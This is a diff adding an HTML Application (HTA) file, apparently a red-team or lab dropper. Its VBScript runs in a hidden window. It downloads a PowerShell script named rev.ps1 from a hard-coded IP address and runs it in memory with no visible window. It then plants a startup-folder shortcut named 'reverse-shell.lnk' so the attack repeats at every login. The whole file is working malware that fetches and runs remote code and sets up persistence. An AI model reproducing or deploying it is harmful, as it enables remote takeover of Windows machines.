@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <hta:application
+        id="oHTA"
+        border="thin"
+        caption="no"
+        maximizebutton="no"
+        minimizebutton="no"
+        sysmenu="no"
+        showintaskbar="yes"
+        windowstate="hidden"
+    />
+    <script language="VBScript">
+        Set objHTTP = CreateObject("MSXML2.XMLHTTP")
+
+        ' URL of the hosted PowerShell script
+        strURL = "http://192.168.4.136:80/rev.ps1"
+
+        ' Download the PowerShell script
+        objHTTP.Open "GET", strURL, False
+        objHTTP.Send
+        strPSScript = objHTTP.responseText
+
+        ' Execute the PowerShell script in memory
+        Set objShell = CreateObject("WScript.Shell")
+        objShell.Run "powershell -NoProfile -NonInteractive -Command """ & strPSScript & """", 0, True
+
+        ' Create persistence in the startup folder
+        strStartupPath = objShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
+        strShortcutPath = strStartupPath & "\reverse-shell.lnk"
+        Set objWScriptShell = CreateObject("WScript.Shell")
+        Set objLink = objWScriptShell.CreateShortcut(strShortcutPath)
+        objLink.TargetPath = "wscript.exe"
+        objLink.Arguments = """C:\Downloads\rev.hta"""
+        objLink.Save
+    </script>
+</head>
+<body>
+</body>
+</html>
